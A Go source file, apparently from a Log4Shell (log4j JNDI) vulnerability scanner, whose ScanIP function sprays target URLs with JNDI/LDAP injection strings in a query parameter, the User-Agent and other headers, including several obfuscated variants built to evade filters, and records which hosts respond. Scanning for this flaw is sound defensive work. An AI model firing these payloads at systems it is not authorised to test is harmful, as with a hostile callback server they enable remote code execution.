package cmd

import (
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/pterm/pterm"
	log "github.com/sirupsen/logrus"
)

func ScanIP(hostUrl string, serverUrl string, wg *sync.WaitGroup, resChan chan string) {
	defer wg.Done()
	const timeoutInterval = 2

	client := &http.Client{
		Timeout: 2 * timeoutInterval * time.Second,
		Transport: &http.Transport{
			TLSHandshakeTimeout:   timeoutInterval * time.Second,
			ResponseHeaderTimeout: timeoutInterval * time.Second,
			ExpectContinueTimeout: timeoutInterval * time.Second,
			TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
		},
	}

	log.Debugf("Target URL: %s", hostUrl)
        var payloads = []string{
                "${jndi:ldap://",
                "${${::-j}ndi:ldap://",
                "${${lower:jndi}:${lower:ldap}://",
                "${${lower:${lower:jndi}}:${lower:ldap}://",
                "${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://",
                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://",
                "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}d${lower:a}${lower:p}}://",
        }
        for _, payload := range payloads {

                baseUrl, err := url.Parse(hostUrl)
                param := url.Values{}
                // targetUrl := baseUrl.String()

                // hintStr := "log4jScanner"
                //hintB64 := base64.StdEncoding.EncodeToString([]byte(hintStr))
                // traceHint := fmt.Sprintf("%s_%s/%s", baseUrl.Hostname(), baseUrl.Port(), hintStr)
                traceHint := fmt.Sprintf("%s_%s", baseUrl.Hostname(), baseUrl.Port())
                //traceHint := fmt.Sprintf("%s_%s", baseUrl.Hostname(), baseUrl.Port())

                // param.Add("x", fmt.Sprintf("${jndi:ldap://%s/%s}", serverUrl, traceHint))
                param.Add("x", payload + serverUrl + "/" + traceHint)
                baseUrl.RawQuery = param.Encode()
                targetUrl := baseUrl.String()
                // targetUserAgent := fmt.Sprintf("${jndi:ldap://%s/%s}", serverUrl, traceHint)
                // targetHeader := fmt.Sprintf("${jndi:ldap://%s/%s}", serverUrl, traceHint)
                targetUserAgent := payload + serverUrl + "/" + traceHint + "_User-Agent" + "}"
                targetHeader := payload + serverUrl + "/" + traceHint + "}"
                //log.Debugf("Target User-Agent: %s", targetUserAgent)
                //log.Debugf("Target X-Api-Version: %s", targetHeader)
                request, err := http.NewRequest("GET", targetUrl, nil)
                if err != nil {
                        pterm.Error.Println(err)
                        log.Fatal(err)
                }
                request.Header.Set("User-Agent", targetUserAgent)
                addCommonHeaders(&request.Header,targetHeader)
                response, err := client.Do(request)
                if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
                        log.Debug(err)
                }
                if response != nil {
                        url := strings.Split(hostUrl, ":")
                        if len(url) != 3 {
                                log.Fatal("Error in response hostUrl parsing:", url)
                        }
                        msg := fmt.Sprintf("request,%s,%s,%d", strings.Replace(url[1], "/", "", -1), url[2], response.StatusCode)
                        updateCsvRecords(msg)
                        resChan <- msg
                        log.Infof(msg)
                }
        }
}

// GetLocalIP returns the non loopback local IP of the host
func GetLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, address := range addrs {
		// check the address type and if it is not a loopback the display it
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}
